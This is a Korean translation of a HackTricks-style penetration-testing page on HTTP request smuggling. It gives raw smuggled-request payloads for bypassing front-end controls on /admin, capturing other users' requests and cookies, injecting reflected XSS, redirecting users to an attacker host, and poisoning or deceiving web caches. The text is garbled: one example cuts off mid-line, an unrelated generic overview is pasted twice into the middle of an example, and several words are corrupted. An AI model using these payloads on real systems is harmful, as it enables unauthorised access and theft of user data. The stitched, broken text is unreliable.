# HTTP 요청 스머글링 / HTTP 디싱크 공격

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 무엇인가

이 취약점은 **프론트엔드 프록시**와 **백엔드** 서버 간의 **비동기화**로 인해 **공격자**가 **프론트엔드** 프록시(로드 밸런스/리버스 프록시)에 의해 **단일 요청**으로 **해석**되고 **백엔드** 서버에 의해 **2개의 요청**으로 **해석**되는 HTTP **요청**을 **전송**할 수 있는 취약점입니다.\
이를 통해 사용자는 **자신 다음에 도착하는 요청을 수정**할 수 있습니다.

### 이론

[**RFC 사양 (2161)**](https://tools.ietf.org/html/rfc2616)

> Transfer-Encoding 헤더 필드와 Content-Length 헤더 필드가 모두 포함된 메시지를 수신한 경우 후자는 무시해야 합니다.

**Content-Length**

> Content-Length 엔티티 헤더는 수신자에게 전송된 엔티티 본문의 크기(바이트 단위)를 나타냅니다.

**Transfer-Encoding: chunked**

> Transfer-Encoding 헤더는 페이로드 본문을 안전하게 전송하기 위해 사용되는 인코딩 형식을 지정합니다.\
> Chunked는 대용량 데이터가 일련의 청크로 전송되는 것을 의미합니다.

### 현실

**프론트엔드** (로드 밸런스 / 리버스 프록시)는 _**content-length**_ 또는 _**transfer-encoding**_ 헤더를 **처리**하고 **백엔드** 서버는 **다른 하나를 처리**하여 2개의 시스템 간에 **비동기화**를 발생시킵니다.\
이는 **공격자가 리버스 프록시로 하나의 요청**을 보낼 수 있게 해주는데, 이 요청은 **백엔드** 서버에서 **2개의 다른 요청으로 해석**됩니다. 이 기술의 **위험**은 **백엔드** 서버가 **주입된 2번째 요청**을 **다음 클라이언트에서 온 것으로 해석**하고 해당 클라이언트의 **실제 요청**이 **주입된 요청**의 **일부**가 되기 때문입니다.

### 특이점

HTTP에서 **새 줄 문자는 2바이트로 구성**됩니다.

* **Content-Length**: 이 헤더는 요청의 본문의 **바이트 수**를 나타내기 위해 **10진수**를 사용합니다. 본문은 마지막 문자로 끝나기를 기대하며, **요청의 끝에는 새 줄이 필요하지 않습니다**.
* **Transfer-Encoding:** 이 헤더는 **다음 청크**의 **바이트 수**를 나타내기 위해 **16진수**를 사용합니다. **청크**는 **새 줄**로 **끝나야** 하지만 이 새 줄은 **길이 지시자에 포함되지 않습니다**. 이 전송 방법은 **0 크기의 청크 다음에 2개의 새 줄**로 끝나야 합니다: `0`
* **Connection**: 내 경험에 따르면 요청 스머글링의 첫 번째 요청에는 **`Connection: keep-alive`**를 사용하는 것이 좋습니다.

## 기본 예제

HTTP 요청 스머글링 공격은 프론트엔드와 백엔드 서버가 `Content-Length` (CL) 및 `Transfer-Encoding` (TE) 헤더를 해석하는 방식의 불일치를 이용하여 모호한 요청을 보내는 것으로 구성됩니다. 이러한 공격은 주로 **CL.TE**, **TE.CL**, **TE.TE**로 나타납니다. 각 유형은 프론트엔드와 백엔드 서버가 이러한 헤더를 우선순위에 따라 처리하는 독특한 조합을 나타냅니다. 서버가 동일한 요청을 다른 방식으로 처리하면서 취약점이 발생하며, 예상치 못한 악의적 결과가 발생할 수 있습니다.

### 취약점 유형의 기본 예제

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE 취약점 (프론트엔드에서 Content-Length 사용, 백엔드에서 Transfer-Encoding 사용)
- **프론트엔드 (CL):** `Content-Length` 헤더를 기반으로 요청을 처리합니다.
- **백엔드 (TE):** `Transfer-Encoding` 헤더를 기반으로 요청을 처리합니다.
- **공격 시나리오:**
- 공격자는 `Content-Length` 헤더의 값이 실제 콘텐츠 길이와 일치하지 않는 요청을 보냅니다.
- 프론트엔드 서버는 `Content-Length` 값에 따라 전체 요청을 백엔드로 전달합니다.
- 백엔드 서버는 `Transfer-Encoding: chunked` 헤더로 인해 요청을 청크로 처리하고 나머지 데이터를 별도의 후속 요청으로 해석합니다.
- **예시:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL 취약점 (프론트엔드에서 Transfer-Encoding 사용, 백엔드에서 Content-Length 사용)
- **프론트엔드 (TE):** `Transfer-Encoding` 헤더를 기반으로 요청을 처리합니다.
- **백엔드 (CL):** `Content-Length` 헤더를 기반으로 요청을 처리합니다.
- **공격 시나리오:**
- 공격자는 청크된 요청을 보내는데, 청크 크기 (`7b`)와 실제 콘텐츠 길이 (`Content-Length: 4`)가 일치하지 않습니다.
- 프론트엔드 서버는 `Transfer-Encoding`을 준수하여 전체 요청을 백엔드로 전달합니다.
- 백엔드 서버는 `Content-Length`를 준수하여 요청의 초기 부분 (`7b` 바이트)만 처리하고 나머지 부분은 의도하지 않은 후속 요청의 일부로 남겨둡니다.
- **예시:**
```
POST / HTTP/1.
#### TE.TE 취약점 (양쪽 모두 사용하는 전송 인코딩, 난독화 사용)
- **서버:** 둘 다 `Transfer-Encoding`을 지원하지만, 난독화를 통해 하나의 서버가 무시하도록 속일 수 있습니다.
- **공격 시나리오:**
- 공격자는 난독화된 `Transfer-Encoding` 헤더를 포함한 요청을 보냅니다.
- 어느 서버(프론트엔드 또는 백엔드)가 난독화를 인식하지 못하면 CL.TE 또는 TE.CL 취약점을 악용할 수 있습니다.
- 서버 중 하나에서 보이는 처리되지 않은 요청 부분이 후속 요청의 일부가 되어 스머글링이 발생합니다.
- **예시:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL 시나리오 (프론트엔드와 백엔드 모두에서 사용하는 Content-Length):**
- 두 서버 모두 요청을 `Content-Length` 헤더를 기반으로 처리합니다.
- 이 시나리오는 일반적으로 스머글링을 유발하지 않습니다. 두 서버가 요청 길이를 해석하는 방식이 일치하기 때문입니다.
- **예시:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL != 0 시나리오:**
- `Content-Length` 헤더가 존재하고 값이 0이 아닌 경우를 가리킵니다. 이는 요청 본문에 내용이 있는 것을 나타냅니다.
- 이는 스머글링 공격을 이해하고 구성하는 데 중요하며, 서버가 요청의 끝을 결정하는 데 영향을 미칩니다.
- **예시:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### 호프-바이-호프 헤더를 통한 강제 실행

호프-바이-호프 헤더를 남용하여 프록시에게 **Content-Length 헤더나 Transfer-Encoding 헤더를 삭제하도록 지시하여 HTTP 요청 스머글링을 악용**할 수 있습니다.
```
Connection: Content-Length
```
**추가 정보를 위해 hop-by-hop 헤더에 대해** 다음을 방문하세요:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## HTTP 요청 스머글링 찾기

HTTP 요청 스머글링 취약점을 식별하는 것은 종종 서버가 조작된 요청에 대해 응답하는 데 걸리는 시간을 관찰하는 타이밍 기술을 사용하여 달성할 수 있습니다. 이러한 기술은 특히 CL.TE 및 TE.CL 취약점을 감지하는 데 유용합니다. 이러한 취약점을 찾기 위해 사용할 수 있는 다른 전략과 도구도 있습니다:

### 타이밍 기술을 사용하여 CL.TE 취약점 찾기
- **방법:**
- 취약한 애플리케이션의 경우 백엔드 서버가 추가 데이터를 기다리도록하는 요청을 보냅니다.
- **예시:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **관찰:**
- 프론트엔드 서버는 `Content-Length`를 기반으로 요청을 처리하고 메시지를 일찍 잘라냅니다.
- 청크 메시지를 기대하는 백엔드 서버는 도착하지 않는 다음 청크를 기다리면서 지연이 발생합니다.

- **지표:**
- 응답 시간 초과 또는 긴 지연.
- 백엔드 서버에서 400 Bad Request 오류를 수신하며 때로는 자세한 서버 정보가 포함됩니다.

### 타이밍 기술을 사용하여 TE.CL 취약점 찾기
- **방법:**
- 취약한 애플리케이션의 경우 백엔드 서버가 추가 데이터를 기다리도록하는 요청을 보냅니다.
- **예시:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **관찰:**
- 프론트엔드 서버는 `Transfer-Encoding`을 기반으로 요청을 처리하고 전체 메시지를 전달합니다.
- `Content-Length`를 기반으로 메시지를 기대하는 백엔드 서버는 도착하지 않는 추가 데이터를 기다리면서 지연이 발생합니다.

### 취약점을 찾기 위한 다른 방법
- **차이 응답 분석:**
- 요청의 약간 다른 버전을 보내고 서버 응답이 예상치 않은 방식으로 다른지 관찰하여 구문 분석의 불일치를 나타내는지 확인합니다.

- **자동화된 도구 사용:**
- Burp Suite의 'HTTP Request Smuggler' 확장 프로그램과 같은 도구를 사용하여 다양한 형태의 모호한 요청을 보내고 응답을 분석하여 이러한 취약점을 자동으로 테스트할 수 있습니다.

- **Content-Length 변동 테스트:**
- 실제 콘텐츠 길이와 일치하지 않는 `Content-Length` 값을 가진 요청을 보내고 서버가 이러한 불일치를 처리하는 방식을 관찰합니다.

- **Transfer-Encoding 변동 테스트:**
- 난독화 또는 잘못된 `Transfer-Encoding` 헤더를 가진 요청을 보내고 프론트엔드 및 백엔드 서버가 이러한 조작에 다르게 응답하는지 모니터링합니다.


### HTTP 요청 스머글링 취약점 테스트

타이밍 기술의 효과를 확인한 후에는 클라이언트 요청을 조작할 수 있는지 확인하는 것이 중요합니다. 간단한 방법은 예를 들어 `/`에 대한 요청을 보내 404 응답을 얻는 것입니다. 이전에 [기본 예제](./#basic-examples)에서 설명한 `CL.TE` 및 `TE.CL` 예제는 클라이언트의 요청을 독립적으로 조작하여 404 응답을 유도하는 방법을 보여줍니다.

**주요 고려 사항**

다른 요청에 간섭하여 요청 스머글링 취약점을 테스트할 때 다음을 염두에 두세요:

* **구분된 네트워크 연결:** "공격" 및 "정상" 요청은 별도의 네트워크 연결을 통해 전송되어야 합니다. 동일한 연결을 사용하는 것은 취약점의 존재를 검증하지 않습니다.
* **일관된 URL 및 매개변수:** 두 요청에 대해 동일한 URL과 매개변수 이름을 사용하려고 노력하세요. 현대적인 애플리케이션은 URL과 매개변수를 기반으로 특정 백엔드 서버로 요청을 라우팅하는 경우가 많습니다. 이를 일치시키면 두 요청이 동일한 서버에서 처리되는 가능성이 높아져 성공적인 공격을 위한 선행 조건이 충족됩니다.
* **타이밍 및 경쟁 조건:** "공격" 요청으로부터의 간섭을 감지하기 위해 "정상" 요청은 다른 동시 애플리케이션 요청과 경쟁합니다. 따라서 "공격" 요청 바로 다음에 "정상" 요청을 보내세요. 바쁜 애플리케이션의 경우 결정적인 취약점 확인을 위해 여러 번의 시도가 필요할 수 있습니다.
* **로드 밸런싱 도전 과제:** 로드 밸런서로 작동하는 프론트엔드 서버는 다양한 백엔드 시스템에 요청을 분산할 수 있습니다. "공격" 및 "정상" 요청이 다른 시스템에 도달하면 공격은 성공하지 않습니다. 이 로드 밸런싱 측면은 취약점을 확인하기 위해 여러 번의 시도가 필요할 수 있습니다.
* **의도하지 않은 사용자 영향:** 공격이 간섭한 다른 사용자의 요청(검출을 위해 보낸 "정상" 요청이 아님)에 영향을 미친다면 이는 공격이 다른 애플리케이션 사용자에게 영향을 미쳤음을 나타냅니다. 지속적인 테스트는 다른 사용자를 방해할 수 있으므로 신중한 접근 방식이 필요할 수 있습니다.


## HTTP 요청 스머글링 남용

### 프론트엔드 보안 제어 우회

### HTTP 요청 스머글링을 통한 프론트엔드 보안 우회

때로는 프론트엔드 프록시에서 들어오는 요청을 검사하여 보안 조치를 시행합니다. 그러나 이러한 조치는 HTTP 요청 스머글링을 악용하여 우회할 수 있으며, 이를 통해 제한된 엔드포인트에 대한 무단 액세스가 가능해집니다. 예를 들어, `/admin`에 접근하는 것이 외부에서 금지되어 프론트엔드 프록시가 이러한 시도를 차단하는 경우가 있습니다. 그러나 이 프록시는 스머글링된 HTTP 요청 내에 포함된 요청을 검사하지 않을 수 있으므로 이러한 제한을 우회할 수 있는 구멍이 남게 됩니다.

다음은 프론트엔드 보안 제어를 우회하기 위해 HTTP 요청 스머글링을 악용하는 방법을 보여주는 예시입니다. 일반적으로 프론트엔드 프록시에 의해 보호되는 `/admin` 경로를 대상으로 합니다:

**CL.TE 예시**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
CL.TE 공격에서는 초기 요청에 `Content-Length` 헤더를 사용하고, 이후에는 내장된 요청에 `Transfer-Encoding: chunked` 헤더를 사용합니다. 프론트엔드 프록시는 초기 `POST` 요청을 처리하지만 내장된 `GET /admin` 요청을 검사하지 못하므로, `/admin` 경로에 무단으로 접근할 수 있습니다.

**TE.CL 예시**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
반대로, TE.CL 공격에서는 초기 `POST` 요청이 `Transfer-Encoding: chunked`를 사용하고, 이후에 포함된 요청은 `Content-Length` 헤더를 기반으로 처리됩니다. CL.TE 공격과 마찬가지로, 프론트엔드 프록시는 숨겨진 `GET /admin` 요청을 간과하여 제한된 `/admin` 경로에 대한 액세스를 부여합니다.

### 프론트엔드 요청 수정 공개 <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

응용 프로그램은 종종 백엔드 서버로 전달되기 전에 들어오는 요청을 수정하기 위해 **프론트엔드 서버**를 사용합니다. 일반적인 수정 사항으로는 `X-Forwarded-For: <클라이언트의 IP>`와 같은 헤더를 추가하여 클라이언트의 IP를 백엔드로 전달하는 것이 있습니다. 이러한 수정 사항을 이해하는 것은 **보호 장치 우회** 또는 **숨겨진 정보 또는 엔드포인트 발견**에 대한 방법을 밝힐 수 있습니다.

프록시가 요청을 어떻게 변경하는지 조사하려면, 백엔드에서 응답으로 에코하는 POST 매개변수를 찾으세요. 그런 다음, 다음과 유사한 방식으로 이 매개변수를 마지막에 사용하여 요청을 작성하세요:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
이 구조에서는 `search=` 뒤에 이어지는 요청 구성 요소들이 있으며, 이는 응답에서 반영되는 매개변수입니다. 이 반영은 이후 요청의 헤더를 노출시킵니다.

중첩된 요청의 `Content-Length` 헤더를 실제 콘텐츠 길이와 일치시키는 것이 중요합니다. 작은 값으로 시작하여 점진적으로 증가시키는 것이 좋습니다. 값이 너무 낮으면 반영된 데이터가 잘릴 수 있고, 값이 너무 높으면 요청이 오류가 발생할 수 있습니다.

이 기술은 TE.CL 취약점의 맥락에서도 적용될 수 있지만, 요청은 `search=\r\n0`로 종료되어야 합니다. 개행 문자와 관계없이 값들은 검색 매개변수에 추가됩니다.

이 방법은 주로 프론트엔드 프록시에 의해 수행된 요청 수정을 이해하기 위해 사용되며, 사실상 자체적인 조사를 수행합니다.

### 다른 사용자의 요청 캡처하기 <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

POST 작업 중에 매개변수의 값으로 특정 요청을 추가함으로써 다음 사용자의 요청을 캡처할 수 있습니다. 다음은 이를 수행하는 방법입니다:

다음 요청을 매개변수의 값으로 추가함으로써 이후 클라이언트의 요청을 저장할 수 있습니다:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
이 시나리오에서는 **comment parameter**가 공개적으로 접근 가능한 페이지의 댓글 섹션에 있는 내용을 저장하기 위해 사용됩니다. 따라서 다음 요청의 내용은 댓글로 표시됩니다.

그러나 이 기술에는 제한이 있습니다. 일반적으로, 이는 스며든 요청에서 사용된 매개변수 구분자까지의 데이터만 캡처합니다. URL 인코딩된 폼 제출의 경우, 이 구분자는 `&` 문자입니다. 이는 피해 사용자의 요청에서 캡처된 내용이 첫 번째 `&`에서 중단됨을 의미하며, 이는 쿼리 문자열의 일부일 수도 있습니다.

또한, TE.CL 취약점이 있는 경우에도 이 접근 방식이 유효하다는 점을 알아두는 것이 좋습니다. 이러한 경우, 요청은 `search=\r\n0`로 끝나야 합니다. 줄 바꿈 문자와 관계없이 값은 검색 매개변수에 추가됩니다.

### HTTP 요청 스며들기를 사용하여 반사 XSS 취약점 악용하기

HTTP 요청 스며들기를 활용하여 **반사 XSS**에 취약한 웹 페이지를 악용할 수 있으며, 다음과 같은 중요한 이점을 제공합니다:

* 대상 사용자와의 상호 작용이 **필요하지 않습니다**.
* HTTP 요청 헤더와 같이 **일반적으로 접근할 수 없는** 요청 부분에서 XSS를 악용할 수 있습니다.

사용자 에이전트 헤더를 통해 반사 XSS에 취약한 웹 사이트의 경우, 다음 페이로드는 이 취약점을 악용하는 방법을 보여줍니다:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
이 페이로드는 다음과 같은 취약점을 이용하기 위해 구성되어 있습니다:

1. `Transfer-Encoding: chunked` 헤더를 포함한 일반적인 `POST` 요청을 시작하여 스머글링의 시작을 나타냅니다.
2. 메시지 본문의 끝을 표시하는 `0`을 추가합니다.
3. 그런 다음, 스머글링된 `GET` 요청이 도입되며, `User-Agent` 헤더에 `<script>alert(1)</script>` 스크립트가 삽입되어 서버가 이후 요청을 처리할 때 XSS를 트리거합니다.

스머글링을 통해 `User-Agent`를 조작함으로써, 이 페이로드는 일반적인 요청 제약을 우회하여 비표준이지만 효과적인 방식으로 Reflected XSS 취약점을 악용합니다.

### HTTP 요청 스머글링을 사용하여 사이트 내 리디렉션을 개방형 리디렉션으로 변환하기 <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### HTTP 요청 스머글링을 사용하여 사이트 내 리디렉션 악용하기 <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

응용 프로그램은 종종 리디렉션 URL에서 `Host` 헤더의 호스트 이름을 사용하여 한 URL에서 다른 URL로 리디렉션합니다. 이는 Apache 및 IIS와 같은 웹 서버에서 일반적입니다. 예를 들어, 슬래시가 없는 폴더를 요청하면 슬래시를 포함한 URL로 리디렉션됩니다:
```
GET /home HTTP/1.1
Host: normal-website.com
```
# HTTP 요청 스머글링

HTTP 요청 스머글링은 웹 애플리케이션에서 발생하는 취약점 중 하나입니다. 이 기술은 프록시 서버와 웹 서버 간의 통신에서 발생하는 문제를 이용하여 공격자가 웹 애플리케이션의 보안을 우회할 수 있게 해줍니다.

## 개요

HTTP 요청 스머글링은 프록시 서버와 웹 서버 간의 통신에서 발생하는 헤더 처리 오류를 이용합니다. 이 오류는 각 서버가 요청을 해석하는 방식에 차이가 있을 때 발생할 수 있습니다. 공격자는 이러한 차이를 이용하여 프록시 서버와 웹 서버 간의 통신을 혼란시키고, 잘못된 요청을 전달하거나 보안을 우회할 수 있습니다.

## 공격 시나리오

1. 공격자는 프록시 서버와 웹 서버 간의 통신에서 헤더 처리 오류를 발생시킬 수 있는 취약점을 찾습니다.
2. 공격자는 잘못된 요청을 생성하여 프록시 서버로 전송합니다.
3. 프록시 서버는 잘못된 요청을 웹 서버로 전달합니다.
4. 웹 서버는 잘못된 요청을 해석하고, 보안을 우회할 수 있는 경우 공격자의 요청을 수행합니다.

## 방어 방법

HTTP 요청 스머글링 공격을 방지하기 위해 다음과 같은 방어 메커니즘을 적용할 수 있습니다.

- 프록시 서버와 웹 서버 간의 통신을 검사하여 헤더 처리 오류를 식별하고 수정합니다.
- 웹 서버에서 잘못된 요청을 거부하도록 구성합니다.
- 웹 애플리케이션에서 입력 유효성 검사를 수행하여 잘못된 요청을 필터링합니다.

## 추가 자료

- [OWASP HTTP 요청 스머글링](https://owasp.org/www-community/attacks/HTTP_Request_Smuggling)
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
비록 해armless해 보이지만, 이 동작은 HTTP 요청 스멀링을 사용하여 사용자를 외부 사이트로 리디렉션하는 데 사용될 수 있습니다. 예를 들어:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
이 밀반입된 요청은 다음 처리되는 사용자 요청이 공격자가 제어하는 웹사이트로 리디렉션될 수 있습니다:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
# HTTP 요청 스머글링

HTTP 요청 스머글링은 웹 애플리케이션에서 발생하는 취약점 중 하나입니다. 이 기술은 프록시 서버와 웹 서버 간의 통신에서 발생하는 문제를 이용하여 공격자가 웹 애플리케이션의 보안을 우회할 수 있게 해줍니다.

## 개요

HTTP 요청 스머글링은 프록시 서버와 웹 서버 간의 통신에서 발생하는 헤더 처리 오류를 이용합니다. 이 오류는 각 서버가 요청을 해석하는 방식에 차이가 있을 때 발생할 수 있습니다. 공격자는 이러한 차이를 이용하여 프록시 서버와 웹 서버 간의 통신을 혼란시키고, 잘못된 요청을 전달하거나 보안을 우회할 수 있습니다.

## 공격 시나리오

1. 공격자는 프록시 서버와 웹 서버 간의 통신에서 헤더 처리 오류를 발생시킬 수 있는 취약점을 찾습니다.
2. 공격자는 잘못된 요청을 생성하여 프록시 서버로 전송합니다.
3. 프록시 서버는 잘못된 요청을 웹 서버로 전달합니다.
4. 웹 서버는 잘못된 요청을 해석하고, 보안을 우회할 수 있는 경우 공격자의 요청을 수행합니다.

## 방어 방법

HTTP 요청 스머글링 공격을 방지하기 위해 다음과 같은 방어 메커니즘을 적용할 수 있습니다.

- 프록시 서버와 웹 서버 간의 통신을 검사하여 헤더 처리 오류를 식별하고 수정합니다.
- 웹 서버에서 잘못된 요청을 거부하도록 구성합니다.
- 웹 애플리케이션에서 입력 유효성 검사를 수행하여 잘못된 요청을 필터링합니다.

## 추가 자료

- [OWASP HTTP 요청 스머글링](https://owasp.org/www-community/attacks/HTTP_Request_Smuggling)
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
이 시나리오에서는 사용자의 JavaScript 파일 요청이 탈취됩니다. 공격자는 악성 JavaScript를 응답으로 제공하여 사용자를 해킹할 수 있습니다.


### HTTP 요청 스머글링을 사용하여 웹 캐시 독자성을 수행하는 방법 <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### HTTP 요청 스머글링을 통한 웹 캐시 독자성 악용 <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

웹 캐시 독자성은 **프런트엔드 인프라의 어떤 구성 요소가 콘텐츠를 캐시**하여 일반적으로 성능을 향상시키는 경우에 실행될 수 있습니다. 서버의 응답을 조작함으로써 **캐시를 독자화**할 수 있습니다.

이전에 우리는 서버 응답을 변경하여 404 오류를 반환할 수 있다는 것을 관찰했습니다(자세한 내용은 [기본 예제](./#basic-examples)를 참조하십시오). 마찬가지로, `/static/include.js` 요청에 대한 응답으로 `/index.html` 콘텐츠를 전달하도록 서버를 속일 수 있습니다. 결과적으로, `/static/include.js` 콘텐츠는 `/index.html`의 캐시로 대체되어 사용자가 `/static/include.js`에 접근할 수 없게 되며, 이는 서비스 거부(DoS)로 이어질 수 있습니다.

이 기술은 특히 **개방형 리디렉션 취약점**이 발견되거나 **개방형 리디렉션으로의 사이트 내 리디렉션**이 있는 경우에 매우 강력해집니다. 이러한 취약점은 `/static/include.js`의 캐시 콘텐츠를 공격자가 제어하는 스크립트로 대체하여 업데이트된 `/static/include.js`를 요청하는 모든 클라이언트에 대한 대규모 크로스 사이트 스크립팅(XSS) 공격을 가능하게 합니다.

아래는 **캐시 독자성과 사이트 내 리디렉션을 개방형 리디렉션으로 결합하여 악용하는** 예시입니다. 목표는 `/static/include.js`의 캐시 콘텐츠를 공격자가 제어하는 JavaScript 코드로 변경하여 제공하는 것입니다:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
`/post/next?postId=3`를 대상으로 하는 내장 요청을 주목하세요. 이 요청은 **Host 헤더 값**을 이용하여 도메인을 결정하고 `/post?postId=4`로 리디렉션됩니다. **Host 헤더**를 변경함으로써 공격자는 요청을 자신의 도메인으로 리디렉션할 수 있습니다 (**온사이트 리디렉션에서 오픈 리디렉션으로**).

성공적인 **소켓 독살** 이후 `/static/include.js`에 대한 **GET 요청**을 시작해야 합니다. 이 요청은 이전의 **온사이트 리디렉션에서 오픈 리디렉션으로** 요청에 의해 오염되며, 공격자가 제어하는 스크립트의 내용을 가져옵니다.

그 후, `/static/include.js`에 대한 모든 요청은 공격자의 스크립트의 캐시된 내용을 제공하여 광범위한 XSS 공격을 수행합니다.


### HTTP 요청 스머글링을 사용하여 웹 캐시 속임수 수행하기 <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **웹 캐시 독살과 웹 캐시 속임수의 차이점은 무엇인가요?**
>
> * **웹 캐시 독살**에서 공격자는 애플리케이션이 악성 콘텐츠를 캐시에 저장하도록 하고, 이 콘텐츠는 캐시에서 다른 애플리케이션 사용자에게 제공됩니다.
> * **웹 캐시 속임수**에서 공격자는 애플리케이션이 다른 사용자에게 속한 민감한 콘텐츠를 캐시에 저장하도록 하고, 그런 다음 공격자는 이 콘텐츠를 캐시에서 검색합니다.

공격자는 스며든 요청을 조작하여 민감한 사용자별 콘텐츠를 가져옵니다. 다음 예시를 고려해보세요:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
만약 이 밀반입된 요청이 정적 콘텐츠를 위한 캐시 엔트리(예: `/someimage.png`)를 오염시킨다면, 피해자의 `/private/messages`에서 민감한 데이터가 정적 콘텐츠의 캐시 엔트리 아래에 캐시될 수 있습니다. 결과적으로, 공격자는 이러한 캐시된 민감한 데이터를 검색할 수 있을 수도 있습니다.

### HTTP 응답 비동기화를 통한 HTTP 요청 밀반입 무기화

HTTP 요청 밀반입 취약점을 발견했지만, 어떻게 이를 악용해야 할지 모르겠습니까? 다른 악용 방법을 시도해보세요:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo intruder 스크립트

### CL.TE

[https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)에서 가져옴
```python
def queueRequests(target, wordlists):

